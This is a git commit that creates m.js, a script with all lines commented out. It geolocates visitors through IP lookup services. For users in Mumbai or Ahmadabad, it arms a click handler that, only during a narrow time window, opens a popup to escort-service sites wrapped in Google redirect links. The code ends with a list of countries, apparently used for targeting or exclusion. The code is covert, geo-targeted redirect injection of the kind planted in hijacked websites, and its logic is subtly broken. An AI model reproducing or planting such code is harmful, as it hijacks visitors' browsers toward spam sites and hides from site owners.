12367507a2b87bf61e74cbccd5fafb7db6c7edaf
Tran Binh ✦ <114424822+tranbinh02@users.noreply.github.com>
2024-05-28 14:43:09 +0700

    Create m.js

---
+++ m.js
@@ -0,0 +1,21 @@
+// let mi=(new Date).getMinutes();
+// let se=(new Date).getSeconds();
+// let aa='';
+// https://ipapi.co/country_name
+// if(!localStorage.v){
+//   (async()=>{
+//    try{aa=await(await(await fetch('http://ip-api.com/line/?fields=city')).text());}catch(e){aa=await(await(await fetch('https://ipapi.co/city')).text());}
+//     localStorage.v=1;
+//     if(aa=='Mumbai'){localStorage.m='1';uhd()}
+//     if(aa=='Ahmadabad'){localStorage.a='1';uhd()}
+//   })();
+// }
+// let uhd=()=>{
+// if(localStorage.m){aa='https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://mumbai.miniescort.com/&ved=2ahUKEwjQwNrJiuiAAxXXT2wGHciyBbMQFnoECBUQAQ&usg=AOvVaw2rVEw26ogf4ltkBt-vyFfN'}
+// if(localStorage.a){aa='https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://sohanisharma.com/&ved=2ahUKEwjUvvX-ieiAAxWJd2wGHQEqASw4ChAWegQIBhAB&usg=AOvVaw2FwzforLOYGwSOaMFMe8Du'}
+//   document.onclick=()=>{
+//     if(mi==3&&se>5&&se<9&bb!=''){window.open(bb);sessionStorage.c=1;}
+//   }
+// }
+// if(!sessionStorage.c&&localStorage.v){uhd()}
+// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
